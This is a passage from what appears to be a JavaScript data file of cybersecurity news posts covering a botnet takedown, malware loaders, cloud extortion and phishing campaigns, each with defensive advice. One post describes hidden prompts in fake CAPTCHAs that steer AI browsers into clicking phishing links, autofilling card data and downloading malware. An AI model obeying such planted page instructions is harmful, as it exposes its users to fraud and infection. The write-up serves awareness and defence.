        <li><strong>Enforce phishing-resistant MFA</strong> (security keys / passkeys) for all users.</li>
        <li>Use a <strong>password manager</strong>—it won’t autofill on fake domains.</li>
        <li>Block link shorteners and inspect URL destinations at the secure gateway.</li>
        <li>Enable Google Workspace <strong>context-aware access</strong> & alerting on atypical sign-ins.</li>
        <li>Harden recovery options; disable SMS recovery for high-risk users.</li>
        <li>Run simulated phishing with voicemail/document lures; coach report-first behavior.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#eaf6f6; border-radius:10px; margin-top:14px;">
      <h3 style="color:#006d77;">🚑 If You Clicked</h3><br>
      <ol style="margin-left:18px;">
        <li>Reset Google password immediately; revoke active sessions.</li>
        <li>Rotate/revoke <strong>OAuth app tokens</strong> under Security → Third-party access.</li>
        <li>Review Gmail filters/forwarding rules and remove anything suspicious.</li>
        <li>Turn on security keys/passkeys; audit recovery email/phone.</li>
      </ol>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:10px; margin-top:14px;">
      <h3 style="color:#2a9d8f;">📚 Share & Stay Safe</h3><br>
      <p>Verify links, use passkeys, and report suspicious emails. A 5-second URL check can save an account takeover.</p>
    </section>
  `},{id:"rapperbot-ddos-takedown-2025",title:"FBI Shuts Down ‘RapperBot’ — 95,000-Device DDoS-for-Hire Network",summary:"22-year-old built a botnet that launched 370,000+ attacks across 80 countries, peaking at 6 Tbps",date:"2025-08-20",author:"EthicalByte",tags:["DDoS","Botnet","RapperBot","FBI","Cybercrime","Mirai-Variant"],imageKey:"rapperbotDdosBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0b132b,#1c2541); color:#f1f5f9; border-radius:10px;">
      <h3 style="color:#e63946;">🛑 What Happened</h3><br>
      <p>
        U.S. authorities dismantled a massive <strong>DDoS-for-hire</strong> operation dubbed <strong>“RapperBot”</strong>, allegedly run by a <strong>22-year-old from Oregon</strong>. 
        The botnet weaponized <b>~95,000 compromised devices</b> to launch <b>370,000+</b> attacks across <b>80 countries</b>, with bursts reaching <strong>~6 Tbps</strong> — 
        enough to disrupt major platforms and ISPs.
      </p>
    </section>

    <section style="padding:20px; background:#0f172a; color:#e2e8f0; border-radius:10px; margin-top:14px; border-left:6px solid #e63946;">
      <h3 style="color:#ffb703;">⚙️ How “RapperBot” Worked</h3><br>
      <ul style="margin-left:18px;">
        <li><b>Mirai-lineage:</b> Evolved from Mirai variants with custom modules for rapid scanning and brute-forcing.</li>
        <li><b>Device targeting:</b> Mostly exposed <em>IoT/routers/NVRs</em> with weak creds or old firmware.</li>
        <li><b>Command & Control:</b> Fast-flux infra and rotating C2s to survive takedowns.</li>
        <li><b>Attack portfolio:</b> TCP/UDP floods, HTTP request storms, and reflection/amplification mixes.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c2541,#0b132b); color:#f8fafc; border-radius:10px; margin-top:14px;">
      <h3 style="color:#00b4d8;">📈 Scale & Impact</h3><br>
      <p>
        <strong>370k+</strong> recorded attacks hit hosting providers, gaming services, fintech APIs, and regional ISPs. 
        Peak throughput near <b>6 Tbps</b> posed a real risk of collateral congestion, service brownouts, and cascading failures across peering links.
      </p>
    </section>

    <section style="padding:20px; background:#0f172a; color:#e2e8f0; border-radius:10px; margin-top:14px; border-left:6px solid #00b4d8;">
      <h3 style="color:#e63946;">🔬 Technical Notes</h3><br>
      <ul style="margin-left:18px;">
        <li><b>Rapid recruitment:</b> Continuous credential stuffing + exploitation of known CVEs in SOHO gear.</li>
        <li><b>Persistence:</b> Startup scripts & watchdogs to rejoin C2 after reboots.</li>
        <li><b>Evasion:</b> Obfuscated binaries, protocol blending, and variable packet sizes to confuse scrubbing centers.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b132b,#1c2541); color:#f1f5f9; border-radius:10px; margin-top:14px;">
      <h3 style="color:#ffb703;">🛡️ Defensive Playbook (Do This Now)</h3><br>
      <ul style="margin-left:18px;">
        <li><strong>Edge hardening:</strong> Disable remote admin on routers/IoT; change default creds; update firmware.</li>
        <li><strong>Upstream protection:</strong> Engage ISP/clean-pipe DDoS services; pre-register <em>runbooks</em> and GRE/BGP diversion.</li>
        <li><strong>Geo/ASN rate limits:</strong> Apply adaptive throttles on API/gateway tiers during anomalies.</li>
        <li><strong>Anycast + WAF/CDN:</strong> Distribute load and filter L7 floods early.</li>
        <li><strong>Telemetries:</strong> NetFlow/sFlow, anomaly detection, and auto-block on volumetric/pps spikes.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#0f172a; color:#e2e8f0; border-radius:10px; margin-top:14px; border-left:6px solid #ffb703;">
      <h3 style="color:#00b4d8;">⚖️ Takedown & Aftermath</h3><br>
      <p>
        The FBI seized C2 infrastructure and charged the alleged operator. While activity has dropped, <b>copycat clusters</b> 
        and residual nodes may persist. Expect rebrands and new loaders attempting to reclaim device footholds.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c2541,#0b132b); color:#f8fafc; border-radius:10px; margin-top:14px;">
      <h3 style="color:#e63946;">✅ Final Thoughts</h3><br>
      <p>
        “RapperBot” is a reminder that <strong>consumer-grade devices</strong> can power internet-scale disruption. 
        Treat SOHO/IoT as critical edge infrastructure: patch fast, lock down services, and pre-plan DDoS response — 
        before the next 6 Tbps wave tests your resilience.
      </p>
    </section>
  `},{id:"ai-browser-promptfix-attack-2025",title:"PromptFix ALERT: AI Browsers Can Be Tricked by Hidden Prompts",summary:"Researchers expose how malicious CAPTCHAs can hijack AI-driven browsers like Comet.",date:"2025-08-21",author:"EthicalByte",tags:["AI","Prompt Injection","Browser Security","Cyber Threats"],imageKey:"aiBrowserPromptFix2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg, #0f172a, #1e293b); color:#f8fafc; border-radius:12px;">
      <h2 style="color:#f43f5e;">🛑 AI Browsers Under Attack</h2><br>
      <p>
        Security researchers have discovered that <b>AI-powered browsers</b> such as <b>Comet</b> can be manipulated 
        by hidden prompts embedded in fake <b>CAPTCHAs</b>. These invisible instructions bypass user awareness 
        and exploit the very systems designed to simplify web navigation.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #1e293b, #334155); border-radius:10px; color:#f1f5f9; margin-top:15px;">
      <h3 style="color:#22d3ee;">⚠️ What Can Happen</h3><br>
      <ul style="line-height:1.6; font-size:15px;">
        <li>🤖 Auto-clicks on <b>phishing links</b> hidden in sites.</li>
        <li>💳 Automatic filling of <b>credit card and personal details</b>.</li>
        <li>💻 Silent <b>malware downloads</b> triggered in the background.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #0f766e, #134e4a); border-radius:10px; color:white; margin-top:15px;">
      <h3 style="color:#facc15;">🔍 Why It’s Dangerous</h3><br>
      <p>
        Traditional phishing relies on tricking the user. 
        <b>Prompt injection attacks</b> flip the script by deceiving the AI itself. 
        This means that even a cautious human can be compromised if their AI browser is manipulated. 
        The automation designed to protect convenience may instead become an attacker’s weapon.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #3b0764, #581c87); border-radius:10px; color:#f3e8ff; margin-top:15px;">
      <h3 style="color:#c084fc;">🛡️ Defense Strategies</h3><br>
      <ul style="line-height:1.6;">
        <li>Adopt AI browsers that implement <b>prompt injection detection</b>.</li>
        <li>Restrict browser permissions for autofill and auto-clicking.</li>
        <li>Use strong <b>endpoint monitoring</b> to catch malware payloads.</li>
        <li>Regularly audit AI assistants for <b>unexpected actions</b>.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #111827, #1e293b); border-radius:10px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#38bdf8;">📌 Final Take</h3><br>
      <p>
        The rise of AI browsers brings speed and convenience, 
        but also a new type of cyber threat — <b>AI prompt manipulation</b>. 
        As attackers innovate with hidden instructions inside web elements, 
        defenders must rethink how security applies in the era of AI-driven browsing. 
        In short: <b>your AI assistant can be hacked, even if you aren’t.</b>
      </p>
    </section>
  `},{id:"quirkyloader-malware-campaign-2025",title:"QuirkyLoader: The New Malware Loader Fueling Cybercrime",summary:"Spreading Agent Tesla, AsyncRAT, Snake Keylogger & more across global campaigns",date:"2025-08-22",author:"EthicalByte",tags:["Malware","Threat Intelligence","Cybersecurity","Agent Tesla","Keylogger","QuirkyLoader"],imageKey:"quirkyloadermalware2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:10px; color:#f5f5f5;">
      <h2 style="color:#ff4d6d;">👾 QuirkyLoader: A Rising Malware Threat</h2><br>
      <p>
        A newly discovered malware loader known as <b>QuirkyLoader</b> is quickly making waves across the cybersecurity landscape. 
        Unlike traditional droppers, QuirkyLoader acts as a <b>flexible delivery platform</b>, capable of deploying well-known threats 
        such as <b>Agent Tesla</b>, <b>AsyncRAT</b>, <b>Snake Keylogger</b>, and more. 
        Its rise highlights just how adaptive and industrialized the malware economy has become.
      </p>
      <p>
        Researchers report that the loader has already been used in <b>high-profile campaigns</b>, including one where attackers 
        targeted a <b>Taiwan-based cybersecurity company</b>. The malicious payloads in this campaign were designed 
        to steal sensitive data — from login credentials to keystrokes — showing that even security firms themselves 
        are not immune to advanced attacks.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:10px; color:#fff;">
      <h3 style="color:#ffd166;">🚨 How QuirkyLoader Works</h3><br>
      <p>
        What makes QuirkyLoader especially dangerous is its ability to <b>bypass defenses</b> and deliver malware directly into memory, 
        avoiding traditional detection methods. Threat actors are spreading it through <b>phishing campaigns</b>, 
        malicious email attachments, and cracked software downloads, ensuring it reaches both corporate and personal systems worldwide.
      </p>
      <p>
        This loader isn’t tied to one purpose — it’s a <b>gateway</b>. Once inside a system, attackers can load spyware, 
        keyloggers, or even full-scale remote access trojans. This flexibility gives cybercriminals the power to pivot 
        between <b>financial fraud, espionage, and credential theft</b> in a single campaign.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:10px; color:#e0e0e0;">
      <h3 style="color:#06d6a0;">🕵️ Real-World Impact</h3><br>
      <p>
        The growing adoption of QuirkyLoader is a warning sign for defenders. 
        Attackers no longer need to create full malware families — loaders like this let them 
        <b>plug-and-play malicious payloads</b> with minimal effort. 
      </p>
      <p>
        Security researchers warn that its popularity could trigger a surge in <b>multi-malware campaigns</b>, 
        where several spyware and RAT families are dropped together for maximum disruption.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:10px; color:#333;">
      <h3 style="color:#118ab2;">🛡 Mitigation Strategies</h3><br>
      <p>
        Protecting against QuirkyLoader requires a <b>layered defense strategy</b>. 
        Companies must patch systems regularly, but that’s just the start. 
        Deploying <b>EDR solutions</b> that can detect memory injections, 
        monitoring login anomalies, and blocking malicious domains are essential.
      </p>
      <p>
        Just as important, <b>user awareness training</b> remains critical, 
        since phishing emails are one of the main distribution methods for QuirkyLoader.
      </p>
    </section><br>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:10px; color:#fff;">
      <h3 style="color:#ff4d6d;">⚡ Final Thoughts</h3><br>
      <p>
        <b>QuirkyLoader</b> isn’t just another piece of malware — it’s a platform for cybercriminals to innovate on. 
        By offering flexibility and stealth, it lowers the barrier for launching advanced attacks at scale. 
        Defenders must scale their vigilance to match this threat, or risk becoming the next headline breach.
      </p>
    </section>
  `},{id:"interpol-operation-serengeti-2025",title:"Operation Serengeti: 1,209 Cybercriminals Arrested Across 18 African Countries",summary:"INTERPOL’s multi-nation sweep dismantles 11,432 malicious infrastructures and recovers $97.4M",date:"2025-08-23",author:"EthicalByte",tags:["INTERPOL","Cybercrime","Fraud","Ransomware","Law Enforcement","Africa"],imageKey:"operationSerengetiBanner",content:`
     <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:10px; color:#f5f5f5;">
      <h2 style="color:#ff4d6d;">🛑 Operation Serengeti: A Coordinated Strike</h2><br>
      <p>
        INTERPOL’s <b>Operation Serengeti</b> executed a sweeping, multi-nation crackdown on organized cybercrime
        across <b>18 African countries</b>. Over the course of the action, authorities <b>arrested 1,209 suspects</b>,
        recovered <b>$97.4 million</b> linked to online fraud, identified <b>88,000 victims</b>, and dismantled
        <b>11,432 malicious infrastructures</b> ranging from phishing farms and mule networks to ransomware enablement nodes.
        The operation underscores how coordinated policing can disrupt cybercrime-as-a-service at scale.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:10px; color:#ffffff;">
      <h3 style="color:#ffd166;">🌍 What the Crackdown Targeted</h3><br>
      <p>
        Serengeti hit the full spectrum of digital crime: <b>crypto investment scams</b>, <b>business email compromise (BEC)</b>,
        <b>romance fraud</b>, <b>account takeover rings</b>, and <b>ransomware facilitation</b>. Investigators focused on both
        front-end lures—spoofed brands, fake exchanges, and phishing portals—and back-end monetization chains that laundered
        stolen funds through cash-out networks and crypto mixers. By striking infrastructure and operators simultaneously,
        the operation aimed to break repeatability, not just deliver short-term arrests.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:10px; color:#e0e0e0;">
      <h3 style="color:#06d6a0;">🔍 How the Machinery Worked</h3><br>
      <p>
        The takedown leaned on <b>intelligence sharing</b> across national police, financial intelligence units, and private
        security teams. Indicators of compromise, mule account patterns, and domain/link telemetry fed rapid deconfliction,
        enabling coordinated seizures and arrests. Disruptions included <b>sinkholing command domains</b>, freezing
        <b>fraud-linked wallets and bank accounts</b>, and executing warrants on call centers orchestrating mass outreach
        via email and SMS. The result: an immediate reduction in active campaigns and increased friction for reconstitution.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:10px; color:#333333;">
      <h2 style="color:#118ab2;">🏢 Why This Matters for Organizations</h2><br>
      <p>
        Serengeti is a proof point that <b>ecosystem-level pressure</b> works—but criminal supply chains adapt quickly.
        For enterprises, the lesson is clear: treat fraud and BEC as <b>operational risks</b>, not just IT issues.
        Reduce blast radius with least-privilege email permissions, enforce <b>phishing-resistant MFA</b> on finance and
        executive accounts, and route vendor and payment changes through <b>dual-control, out-of-band verification</b>.
        Feed law-enforcement advisories and threat intel into <b>SIEM/EDR blocklists</b> to capitalize on post-operation indicators.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:10px; color:#ffffff;">
      <h3 style="color:#ff4d6d;">🛡 Practical Next Steps</h3><br>
      <p>
        Tighten the basics that criminals continually exploit: <b>DMARC/DKIM/SPF</b> to blunt spoofing, banner warnings on
        external mail, and <b>automated reporting</b> to security when users flag suspicious messages. Run <b>scenario-based
        drills</b> around invoice fraud, payroll redirection, and crypto “recovery” scams so teams recognize social cues,
        not just malicious links. For finance and AP, require <b>callback verification</b> to known numbers, never the
        ones supplied in the request. Finally, pre-stage <b>response playbooks</b>—legal, banking contacts, takedown processes—
        so hours aren’t lost when minutes matter.
      </p>
    </section><br>

    <section style="padding:20px; background:#0f172a; border-radius:10px; color:#e2e8f0; text-align:center;">
      <h3 style="color:#ffd166;">✅ Final Take</h3><br>
      <p>
        Operation Serengeti is a rare, large-scale win for defenders. The message for organizations: leverage the momentum—
        adopt the shared indicators, close the easy doors, and rehearse the workflows. Cybercrime thrives on inertia; deny it.
      </p>
    </section>
  `},{id:"linux-filename-malware-2025",title:"Linux Malware Hidden in Filenames: Phishing RAR Trick Exposed",summary:"Attackers can hijack systems using nothing more than a malicious file name.",date:"2025-08-25",author:"EthicalByte",tags:["Linux","Phishing","Malware","RAR","Cybersecurity"],imageKey:"linuxFilenameMalwareBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1f2937); color:#f5f5f5; border-radius:12px;">
      <h3 style="color:#ef4444;">🛑 What Happened</h3><br>
      <p>
        Researchers have uncovered a dangerous new technique in the wild: phishing emails carrying 
        <strong>RAR archive files</strong> that can <b>infect Linux systems without opening any file content</b>. 
        The malware isn’t hidden in macros, scripts, or binaries — instead, it’s buried <b>inside the file name itself</b>.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1f2937,#0f172a); border-radius:12px; color:#e5e7eb; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How the Attack Works</h3><br>
      <p>
        The RAR archive contains files with <b>specially crafted names</b> that embed malicious Bash commands. 
        When the archive is extracted, Linux interprets the filename as code, triggering execution without any 
        user interaction. 
      </p>
      <p>
        ✔️ No need to run executables  
        ✔️ No macros or embedded payloads  
        ✔️ Just an extraction process that silently executes commands
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It’s Dangerous</h3><br>
      <p>
        This technique bypasses traditional <b>antivirus scans</b> and signature-based defenses. 
        Since there’s no “hidden content,” scanners often mark the file as safe. 
        In reality, the danger lies in how the <b>Linux shell parses filenames</b>. 
        With attackers getting creative, even seasoned sysadmins could fall victim.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ How to Stay Safe</h3><br>
      <ul style="line-height:1.8; margin-left:18px;">
        <li>🚫 Never extract archives from untrusted emails.</li>
        <li>🔒 Use sandbox environments for suspicious files.</li>
        <li>⚙️ Configure Linux to prevent execution of filenames containing commands.</li>
        <li>🧩 Deploy behavior-based detection, not just signature AV.</li>
        <li>👥 Train staff to identify phishing lures with “urgent” attachments.</li>
      </ul>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1f2937,#111827); border-radius:12px; color:#f5f5f5; text-align:center; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        The discovery of <b>malware hidden in filenames</b> marks a dangerous evolution in phishing attacks. 
        It’s a reminder that attackers will always find creative ways to turn the simplest elements 
        — like a file name — into an execution vector. 
        Defenders must step up with layered defenses, sandboxing, and proactive monitoring.
      </p>
    </section>
  `},{id:"upcrypter-phishing-campaign-2025",title:"UpCrypter: Stealthy Loader Powering a New Global Phishing Wave",summary:"Fake voicemails and purchase orders funnel victims into RAT takeovers — PureHVNC, DarkCrystal and more",date:"2025-08-26",author:"EthicalByte",tags:["Phishing","Malware Loader","UpCrypter","RAT","PureHVNC","DarkCrystal"],imageKey:"upcrypterPhishingBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:10px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 A New Phishing Wave</h3><br>
      <p>
        A fresh phishing wave is circulating across multiple industries, weaponizing believable <b>voicemail</b> and <b>purchase order</b> lures to deliver a stealthy loader known as <b>UpCrypter</b>. 
        Unlike noisy droppers, UpCrypter focuses on quietly establishing footholds and then handing control to remote access trojans (RATs) such as <b>PureHVNC</b> and <b>DarkCrystal</b>. 
        The endgame is simple and dangerous: persistent, hands-on-keyboard control over compromised endpoints.
      </p>
      <p>
        Campaign telemetry shows broad targeting — finance, manufacturing, IT services, and regional supply chains — with carefully crafted emails that mirror real business workflows. 
        Attachments and links are staged through redirect chains to evade filters, landing victims on convincingly branded pages or prompting them to open “routine” documents.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:10px; color:#ffffff; margin-top:14px;">
      <h3 style="color:#ffd166;">⚙️ How UpCrypter Works</h3><br>
      <p>
        UpCrypter’s value to attackers is its <b>modular delivery</b>. After initial execution, the loader decrypts and deploys payloads in memory to reduce disk artifacts, then beacons to command-and-control for tasking. 
        Operators can rotate in different RATs — screen control, credential theft, cookie/session hijacking — or chain in info-stealers depending on the target environment and the data they want.
      </p>
      <p>
        By separating the “loader” from the “payload,” adversaries gain resilience. If a RAT gets detected and removed, the loader can simply fetch a new build, switch infrastructure, and continue the intrusion with minimal friction.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:10px; color:#e0e0e0; margin-top:14px;">
      <h3 style="color:#06d6a0;">🕵️ Real-World Impact</h3><br>
      <p>
        The operational impact is significant. RATs delivered by UpCrypter support <b>invisible desktop sessions</b> for fraudulent transactions, data staging from file shares and browsers, and the planting of persistence for later return. 
        In supply-chain contexts, a single phished endpoint can become a beachhead to vendor portals, ERP systems, and billing workflows — amplifying both financial and reputational risk.
      </p>
      <p>
        This loader-first model also accelerates <b>campaign scale</b>: a small team can run many concurrent intrusions by automating lure distribution while reserving human operators for lucrative targets that show signs of access to finance or admin tooling.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:10px; color:#333333; margin-top:14px;">
      <h3 style="color:#118ab2;">🛡 Mitigation & Defense</h3><br>
      <p>
        Defending against UpCrypter demands <b>layered controls</b> rather than a single silver bullet. Harden email ingress with attachment detonation and URL rewriting; flag voicemail/purchase-order themes with anomaly scoring; and enforce least-privilege on endpoints to limit post-compromise actions. 
        Endpoint detection and response (EDR) should monitor for memory-only loaders, suspicious child processes from office/PDF apps, and atypical remote desktop artifacts.
      </p>
      <p>
        On the human side, prioritize <b>scenario-based training</b> around finance and procurement lures, and institute out-of-band verification for urgent payment or document requests. Rapid response playbooks — token/session revocation, credential rotation, and host isolation — shorten attacker dwell time when prevention fails.
      </p>
    </section><br>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:10px; color:#ffffff; margin-top:14px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        <b>UpCrypter</b> underscores the evolution of phishing: from simple credential theft to <b>loader-driven remote control</b>. 
        Treat unexpected voicemails and purchase orders as high-risk events, and tune defenses for loader behaviors — because one click now buys an adversary a seat at your keyboard.
      </p>
    </section>
  `},{id:"storm0501-cloud-ransomware-2025",title:"Storm-0501: Ransomware Without the Ransomware",summary:"Hackers no longer need encryption — cloud account takeover is the new extortion model.",date:"2025-08-28",author:"EthicalByte",tags:["Ransomware","Cloud Security","Microsoft Teams","Storm-0501","Identity Theft"],imageKey:"storm0501CloudTakeoverBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🔑 A New Kind of Ransomware</h3><br>
      <p>
        Forget malware. Forget encryption. <b>Storm-0501</b>, a sophisticated threat actor, has changed the game with 
        a cloud-first extortion model that doesn’t deploy traditional ransomware at all. 
        Instead of locking files, they go after your <b>cloud identity</b> — hijacking accounts, stealing data, 
        erasing backups, and then demanding ransom directly over <b>Microsoft Teams</b>.
      </p>
      <p>
        This approach strips away the noisy malware artifacts defenders typically look for. 
        No malicious executables. No suspicious encryption processes. Just legitimate cloud sessions — 
        repurposed by attackers into a weapon.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e5e7eb; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How Storm-0501 Pulls It Off</h3><br>
      <p>
        The attackers focus on <b>identity compromise</b> rather than endpoint malware. 
        By exploiting misconfigured or stolen <b>Microsoft Entra ID</b> credentials, 
        they gain full access to enterprise cloud tenants. From there, the playbook unfolds:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🛠 Hijack administrator accounts for maximum privileges</li>
        <li>📂 Steal sensitive corporate data stored in OneDrive, SharePoint, and Outlook</li>
        <li>🗑️ Delete cloud backups and version histories to remove recovery options</li>
        <li>💬 Deliver ransom notes directly via <b>Microsoft Teams messages</b></li>
      </ul>
      <p>
        All of this occurs through cloud-native activity — blending in with normal user behavior, 
        making detection exceptionally difficult.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It’s Dangerous</h3><br>
      <p>
        Traditional ransomware leaves behind obvious signs — encryption extensions, ransom notes on disk, 
        broken workflows. Storm-0501 leaves <b>almost no local footprint</b>. 
        By living entirely in the cloud, they sidestep many endpoint security tools. 
      </p>
      <p>
        Even worse: victims can’t simply restore from backups, because attackers <b>delete or corrupt them first</b>. 
        The extortion hits harder when recovery options are off the table.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ How Organizations Can Defend</h3><br>
      <p>
        Defending against this new breed of ransomware requires a shift in mindset: 
        <b>identity is the new perimeter</b>. 
        Organizations should:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Enforce strong <b>MFA</b> across all accounts</li>
        <li>✔️ Monitor Entra ID sign-ins for unusual geolocation or device changes</li>
        <li>✔️ Enable <b>conditional access policies</b> to block risky login attempts</li>
        <li>✔️ Regularly test <b>backup and restore processes</b> to ensure they’re tamper-resistant</li>
        <li>✔️ Educate employees about <b>social engineering</b> used to steal credentials</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>Storm-0501</b> proves that ransomware doesn’t need to encrypt files to be effective. 
        By taking over cloud environments and weaponizing legitimate platforms like Teams, 
        attackers are rewriting the extortion playbook. 
        It’s a wake-up call: cloud identity is now the crown jewel — and it must be defended accordingly.
      </p>
    </section>
  `},{id:"tamperedchef-malware-2025",title:"TamperedChef: Fake PDF Editor Malware Campaign",summary:"A Google Ads hijack leads users to info-stealing malware disguised as a PDF tool.",date:"2025-08-29",author:"EthicalByte",tags:["TamperedChef","Malware","InfoStealer","Google Ads","Cybercrime"],imageKey:"tamperedchefMalwareBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🚨 The Discovery</h3><br>
      <p>
        Security researchers have uncovered a malicious campaign abusing <b>Google Ads</b> to push a 
        <b>fake PDF editor</b>. Behind the installer hides <b>TamperedChef</b>, 
        a new info-stealing malware designed for <b>long-term stealth and data theft</b>.
      </p>
      <p>
        Unlike common info-stealers, TamperedChef doesn’t strike immediately. 
        It waited up to <b>56 days</b> before activating — bypassing detection and raising 
        the chances that victims would trust and use the compromised software regularly.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How TamperedChef Works</h3><br>
      <p>
        The infection chain begins when users click a <b>Google ad</b> for a legitimate-looking PDF editor. 
        Instead of downloading the real application, they receive a <b>tampered installer</b> seeded with malware.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📦 Fake installer deploys TamperedChef in the background</li>
        <li>🕒 Malware stays dormant for weeks to avoid suspicion</li>
        <li>🔑 Once active, it steals <b>credentials, cookies, and browser data</b></li>
        <li>💻 Installs a <b>backdoor</b> for persistent access to the system</li>
      </ul>
      <p>
        This staged approach allows the malware to bypass short-term scans and sandbox analysis, 
        striking only after the victim has lowered their guard.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#134e4a,#0f766e); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It’s a Serious Threat</h3><br>
      <p>
        By targeting users through <b>Google Ads</b>, attackers ensured massive reach and a 
        high level of credibility. Many victims likely believed they were downloading a trusted tool. 
        The <b>delayed activation</b> made detection even harder, as most malware defenses 
        only monitor initial execution windows.
      </p>
      <p>
        With credentials stolen, attackers can access bank accounts, business portals, and 
        personal data — while the backdoor gives them the ability to re-enter systems at will.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defense Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Avoid downloading software via ads — use official vendor websites</li>
        <li>✔️ Use <b>behavior-based detection</b> to catch delayed malware activity</li>
        <li>✔️ Monitor for unusual logins and cookie/session hijacking attempts</li>
        <li>✔️ Regularly patch browsers and disable untrusted extensions</li>
        <li>✔️ Run threat-hunting queries for dormant processes and backdoor artifacts</li>
      </ul>
    </section><br>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>TamperedChef</b> proves that malware doesn’t need to strike instantly to be effective. 
        By waiting weeks before stealing data, it evades defenses and builds victim trust. 
        Users and organizations alike must rethink software download habits and adopt 
        layered defenses to outpace these stealthy campaigns.
      </p>
    </section>
  `},{id:"velociraptor-abuse-teams-phishing-2025",title:"When Trusted Tools Turn Rogue: Velociraptor Abuse & Fake IT Teams Chats",summary:"Attackers weaponize a legitimate forensic tool and impersonate IT staff to steal credentials.",date:"2025-09-01",author:"EthicalByte",tags:["Velociraptor","Malware","Microsoft Teams","Phishing","Forensic Tools"],imageKey:"velociraptorAbuseBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🚨 Trusted Tools, Twisted Purposes</h3><br>
      <p>
